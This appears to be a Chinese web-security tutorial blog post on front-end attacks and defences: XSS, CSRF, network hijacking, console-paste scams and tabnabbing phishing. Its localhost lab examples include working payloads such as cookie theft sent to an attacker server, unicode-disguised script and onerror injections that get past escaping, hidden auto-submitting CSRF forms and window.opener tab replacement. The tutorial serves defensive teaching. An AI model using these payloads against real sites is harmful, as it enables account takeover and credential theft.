### 为什么要攻击?

其实真正为了玩的心态去进行黑网站的人，还是少数。多数攻击还是有利益的成分在里面的。我模糊的记得，以前听腾讯的工程师说过一句话，大概是这样的：开发者不可能确保自己的应用绝对无法被攻击，但是只要攻击我们的时候，黑客花费的成本远比他可以获取的利益大得多，黑客就不会去攻击。防范强如支付宝、QQ等产品，也都曾被报过漏洞，看来防御不是绝对的，我们只能想办法让我们的应用更加安全。

### 前端攻击都有哪些形式，我该如何防范？
```
1 XSS攻击
2 CSRF攻击
3 网络劫持攻击
4 控制台注入代码
5 钓鱼
```
下面详细说明这几种攻击形式：

#### 1 XSS攻击

   1.1 是什么？
   
   百度百科中如是说道：XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。 其实在web前端方面，可以简单的理解为一种javascript代码注入.
   
   例如：
```
<?php
    $username="侯医生";
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <div>
            用户名：<?php echo $username;?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
    </body>
</html>
```  
但是，如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。
代码如下，效果如图1.1.2
```
<?php
    $username="<script>alert('侯医生');</script>";
?>
```

如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码：

```
$.ajax({
    url: '自己的服务器',
    dataType: 'jsonp',
    data: {'盗取的用户cookie': document.cookie}
});
```
再在各个QQ群中，散播自己的空间，引诱别人来访问。就可以拿到用户在这个域名下的cookie或者其他隐私了

#### 1.2 如何防范？

 目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示，代码如下，效果如图1.2.1
 
 ```
 <?php
    $username="<script>alert('侯医生');</script>";
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码-->
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
    </body>
</html>
 ```
 虽然显示出来是有script标签的，但是实际上，script标签的左右尖括号(><)，均被转义为html字符实体，所以，便不会被当做标签来解析的，但是实际显示的时候，这两个尖括号，还是可以正常展示的。

#### 1.3 升级攻击

上一小节我们防住了script标签的左右尖括号，蓝鹅，聪明的黑客们还是想出了好办法去破解，我们知道，直接给innerHTML赋值一段js，是无法被执行的。比如，
```
$('div').innerHTML = '<script>alert("okok");</script>';
```
但是，jquery的append可以做到，究其原因，就是因为jquery会在将append元素变为fragment的时候，找到其中的script标签，再使用eval执行一遍。jquery的append使用的方式也是innerHTML(如图1.3.1.1)。而innerHTML是会将unicode码转换为字符实体的。

利用这两种知识结合，我们可以得出，网站使用append进行dom操作，如果是append我们可以决定的字段，那么我们可以将左右尖括号，使用unicode码伪装起来，就像这样--"\u003cscript\u003ealert('okok');"。接下来转义的时候，伪装成\u003的<会被漏掉，append的时候，则会被重新调用。代码如下，效果如图1.3.1.2

```
<?php
    $username="\u003cscript\u003ealert('okok');";
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
        <script src="https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"></script>
    </head>
    <body>
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
        <div>版权所有：<span id="username_info"></span></div>
        <script>
            $('#username_info').append("<?php echo htmlentities($username);?>");
        </script>
    </body>
</html>
```

虽然进行了转义，注入的代码还是会再次被执行。

#### 1.3.2 img标签的再次利用

再来一种攻击方式，img标签的小贴士。
这里我们需要重温一个小知识点-----img标签，在加载图片失败的时候，会调用该元素上的onerror事件。我们正可以利用这种方式来进行攻击。我们先来看一下，正常的用户分享图片的行为怎么做。代码如下，展示如图1.3.2.1
```
<?php
    $username="<script>alert('侯医生');</script>";
    $imgsrc="http://img5.imgtn.bdimg.com/it/u=1412369044,967882675&fm=11&gp=0.jpg";
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1，这个是图片：
            <img src="<?php echo $imgsrc;?>" />
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
    </body>
</html>
```

但是，如果这张图片的地址我们换种写法呢？
```
<?php
    $imgsrc="\" onerror=\"javascript:alert('侯医生');\"";
?>
```
我们再来看看拼装好的html源码，如图1.3.2.2：

看官你可能会说了，再转义呗。是的，老套路，我们接着进行转义---你这个毛病呀，就算治好了(老中医口吻)。
#### 1.3.3 组合使用

但是......但是，道高一尺魔高一丈，虽然防住了img标签直接的输出，但是我们的攻击点又来了，我们将1.3.1中所说的方式与1.3.2中所说的方式进行结合，进行一种组合式攻击，我们之前说过，innerHTML赋值的script标签，不会被执行，但是innerHTML赋值一个img标签是可以被识别的。我们把img标签的左右尖括号，使用unicode进行伪装，让转义方法认不出来，即使innerHTML也可以利用上了，代码如下，效果如图1.3.3.1
```
<?php
    $username="\u003cimg src=\'\' onerror=javascript:alert(\'okok\');\u003e";
?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
        <div>版权所有：<span id="username_info"></span></div>
        <script>
            document.getElementById('username_info').innerHTML = "<?php echo htmlentities($username);?>";
        </script>
    </body>
</html>
```
这样，innerHTML也可以派上用场，再次突破防线。
#### 1.4 升级防御

看来，我们需要再次进行防御升级了，我们将输出的字符串中的\反斜杠进行转义(json转义)。这样，\就不会被当做unicode码的开头来被处理了。代码如下：
```
document.getElementById('username_info').innerHTML = <?php echo json_encode(htmlentities($username));?>;

```

#### 1.5 XSS再升级

都说了道高一尺魔高一丈了，你以为防得住后端输出，黑客大大们就没办法攻击了吗。我们有的时候，会有一些习惯，拿URL上的get参数去构建网页。好比说，直接拿url上的用户名去展示啦，拿url上的一些回跳地址之类的。但是url上的参数，我们是无法提前对其进行转义的。接下来，来个例子，代码如下：

```
<html>
    <head>
        <meta charset="utf-8" />
        <script src="https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"></script>
    </head>
    <body>
        <div>
            用户名：<?php echo htmlentities($username);?>
        </div>
        <div>
            第一条状态：侯医生的状态1
        </div>
        <div>
            第二条状态：侯医生的状态2
        </div>
        <div>
            第三条状态：侯医生的状态3
        </div>
        <div>版权所有：<span id="username_info"></span></div>
        <script>
            var param = /=(.+)$/.exec(location.search);
            var value = decodeURIComponent(param[1]);
            $('#username_info').append(value);
        </script>
    </body>
</html>
```
上述代码，满足了一个很正常的需求，解开URL中的一个参数，并将其渲染至页面上。但是，这里面存在一个风险，如果黑客在URL的这个参数中，加入js代码，这样便又会被执行(如图1.5.1所示)。

#### 1.6 防御再次升级

像这种从url中获取的信息，笔者建议，最好由后端获取，在前端转义后再行输出，代码如下，效果如图1.6.1

```
<script>
    var value = decodeURIComponent("<?php echo htmlentities($_GET['username']);?>");
    $('#username_info').append(value);
</script>
```
使用url中的参数的时候要小心，更不要拿URL中的参数去eval。

#### 1.7 保护好你的cookie
  如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的。php的设置方法如下：
```
<?php
    setcookie("userpass", "doctorhou-shuai", NULL, NULL, NULL, NULL, TRUE);
?>
```
话说回来，其实还有很多xss的升级攻击方式，同学们有兴趣的话，可以自己去研究一下。(不要干坏事儿哦)

### 2 CSRF攻击

#### 2.1 什么是CSRF攻击？
CSRF攻击在百度百科中的解释是：
   CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上(如：你所使用的网络银行的网站)。

#### 2.2 如何攻击？
 ##### 2.2.1 要合理使用post与get

通常我们会为了省事儿，把一些应当提交的数据，做成get请求。殊不知，这不仅仅是违反了http的标准而已，也同样会被黑客所利用。
比如，你开发的网站中，有一个购买商品的操作。你是这么开发的：

```
<?php
// 从cookie中获取用户名，看似稳妥
$username = $_COOKIE['username'];
$productId = $_GET['pid'];
// 这里进行购买操作
//store_into_database($username, $productId);
?>
<meta charset="utf-8" />
<?php
echo $username . '买入商品：' . $productId;
?>
```
而商品ID图个省事儿，就使用了url中的get参数。买商品的话，如图2.2.1.1所示

那么，黑客的网站可以这样开发：
```
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <img src="http://localhost:8082/lab/xsrflab/submit.php?pid=1" />
    </body>
</html>

```
所以，我们日常的开发，还是要遵循提交业务，严格按照post请求去做的。更不要使用jsonp去做提交型的接口，这样非常的危险。

#### 2.2.2 xsrf攻击升级

如果你使用了post请求来处理关键业务的，还是有办法可以破解的。我们的业务代码如下：
```
<?php
$username = $_COOKIE['username'];
// 换为post了，可以规避黑客直接的提交
$productId = $_POST['pid'];
// 这里进行购买操作
//store_into_database($username, $productId);
?>
<meta charset="utf-8" />
<?php
echo $username . '买入商品：' . $productId;
?>
```
黑客代码如下：

```
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
        <script src="https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"></script>
    </head>
    <body>
        <button id="clickme">点我看相册</button>
        <script>
            $('#clickme').on('click', function () {
                // 用户再不知情的情况下，提交了表单，服务器这边也会以为是用户提交过来的。
                $('#myform').submit();
            });
        </script>
        <form id="myform" style="display:none;" target="myformer" method="post" action="http://myhost:8082/lab/xsrflab/submit.php">
            <input type="hidden" name="pid" value="1">
        </form>
        <iframe name="myformer" style="display:none;"></iframe>
    </body>
</html>
```

点击后，用户进行了提交，却连自己都不知情。这种情况如何防御呢？
最简单的办法就是加验证码，这样除了用户，黑客的网站是获取不到用户本次session的验证码的。但是这样也会降低用户的提交体验，特别是有些经常性的操作，如果总让用户输入验证码，用户也会非常的烦。
另一种方式，就是在用访问的页面中，都种下验证用的token，用户所有的提交都必须带上本次页面中生成的token，这种方式的本质和使用验证码没什么两样，但是这种方式，整个页面每一次的session，使用同一个token就行，很多post操作，开发者就可以自动带上当前页面的token。如果token校验不通过，则证明此次提交并非从本站发送来，则终止提交过程。如果token确实为本网站生成的话，则可以通过。
代码如下，防御效果如图2.2.2.2

```
<?php
$username = $_COOKIE['username'];
$productId = $_POST['pid'];
$token=$_POST['token'];
// 校验算法例子
function check_token($token) {
    if ($token==='doctorhou-shuai') {
        return true;
    }
    return false;
}
if (!check_token($token)) {
    // 如果校验未通过，则中止
    return ;
}
// 这里进行购买操作
//store_into_database($username, $productId);
?>
<meta charset="utf-8" />
<?php
echo $username . '买入商品：' . $productId;
?>
```
如上图，并没有携带本站每次session生成的token，则提交失败。
本站的网站form，则都会自动携带本站生成的token

```
<?php function token_creater() {
    // 本站生成token的方法
    return 'doctorhou-shuai';
}?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
        <script src="https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"></script>
    </head>
    <body>
        <form id="myform" target="myformer" method="post" action="http://localhost:8082/lab/xsrflab/submit.php">
            商品名称：<input name="pid" value="1">
            <input type="hidden" name="token" value="<?php echo token_creater();?>" />
            <input type="submit" value="提交" />
        </form>
        <iframe name="myformer" style="display:none;"></iframe>
    </body>
</html>
```
当然，上面的只是例子，具体的token生成，肯定是要随着session与用户ID去变的，如果各位看官觉得自己的网站也需要加个token，请自行百度，进行深入的学习


#### 3 网络劫持攻击

很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以结果该用户收发的所有数据。这里，建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。

如果你的网站还没有进行https加密的化，则在表单提交部分，最好进行非对称加密--即客户端加密，只有服务端能解开。这样中间的劫持者便无法获取加密内容的真实信息了。

#### 4 控制台注入代码

不知道各位看官有没有注意到天猫官网控制台的警告信息，如图4.1所示，这是为什么呢？因为有的黑客会诱骗用户去往控制台里面粘贴东西（欺负小白用户不懂代码），比如可以在朋友圈贴个什么文章，说:"只要访问天猫，按下F12并且粘贴以下内容，则可以获得xx元礼品"之类的，那么有的用户真的会去操作，并且自己隐私被暴露了也不知道。


天猫这种做法，也是在警告用户不要这么做，看来天猫的前端安全做的也是很到位的。不过，这种攻击毕竟是少数，所以各位看官看一眼就行，如果真的发现有的用户会被这样攻击的话，记得想起天猫的这种解决方案。

![](  https://github.com/moveondo/vue-ManageSystem/blob/master/static/img/tianmao.png)


#### 5 钓鱼

钓鱼也是一种非常古老的攻击方式了，其实并不太算前端攻击。可毕竟是页面级别的攻击，我们也来一起聊一聊。我相信很多人会有这样的经历，QQ群里面有人发什么兼职啦、什么自己要去国外了房子车子甩卖了，详情在我QQ空间里啦，之类的连接。打开之后发现一个QQ登录框，其实一看域名就知道不是QQ，不过做得非常像QQ登录，不明就里的用户们，就真的把用户名和密码输入了进去，结果没登录到QQ，用户名和密码却给人发过去了。
其实这种方式，在前端也有利用。下面，我们就来试试如果利用前端进行一次逼真的钓鱼。
1 首先，我们在xx空间里分享一篇文章，然后吸引别人去点击。效果如图5.1.1

```
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <div>
        当前你在xx空间
        </div>
        <h1>侯博士的分享</h1>
        <section>
        咱们班当年班花，现在长这样：
        <!--这是咱们的钓鱼网站-->
        <a href="http://localhost:8082/lab/fish/cheat.php" target="_blank">点我查看</a>
        </section>
    </body>
</html>

```
2 接着，我们在cheat.php这个网站上面，将跳转过来的源网页地址悄悄的进行修改。效果如图5.2.1

```
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset="utf-8" />
        <script src="https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"></script>
    </head>
    <body>
        你想看的信息：
        xxxxxxxxxxxxxx
        xxxxxxxxxxxxxx
        <script>
            // 在用户不知情的情况下，对跳转的来源网页进行地址替换
            window.opener.location = 'http://localhost:8082/lab/fish/myfishsite.php';
        </script>
    </body>
</html>

```
于是，在用户访问了我们的欺骗网站后，之前的tab已经悄然发生了变化，我们将其悄悄的替换为了钓鱼的网站，欺骗用户输入用户名、密码等。

这种钓鱼方式比较有意思，重点在于我们比较难防住这种攻击，我们并不能将所有的页面链接都使用js打开。所以，要么就将外链跳转的连接改为当前页面跳转，要么就在页面unload的时候给用户加以提示，要么就将页面所有的跳转均改为window.open，在打开时，跟大多数钓鱼防治殊途同归的一点是，我们需要网民们的安全意识提高。

#### 我们平时开发要注意些什么？

1 开发时要提防用户产生的内容，要对用户输入的信息进行层层检测
2 要注意对用户的输出内容进行过滤(进行转义等)
3 重要的内容记得要加密传输(无论是利用https也好，自己加密也好)
4 get请求与post请求，要严格遵守规范，不要混用，不要将一些危险的提交使用jsonp完成。
5 对于URL上携带的信息，要谨慎使用。
6 心中时刻记着，自己的网站哪里可能有危险。

参考链接：https://segmentfault.com/a/1190000006672214#articleHeader2



